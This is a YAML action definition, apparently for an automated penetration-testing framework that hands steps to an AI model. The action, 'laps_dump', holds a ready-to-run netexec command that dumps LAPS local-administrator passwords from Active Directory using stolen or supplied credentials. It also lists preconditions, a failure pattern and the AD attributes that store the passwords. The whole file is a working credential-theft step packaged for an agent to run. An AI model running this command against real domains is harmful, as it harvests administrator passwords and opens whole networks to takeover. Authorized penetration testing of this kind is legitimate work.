name: laps_dump
category: ad
description: Dump LAPS passwords from AD
preconditions:
  - domain_joined
  - has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: "netexec ldap {target_ip} -u '{username}' -p '{password}' -M laps"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "LAPS stores local admin passwords in AD attribute ms-Mcs-AdmPwd. Readable by authorized users/groups. LAPSv2 uses ms-LAPS-Password."
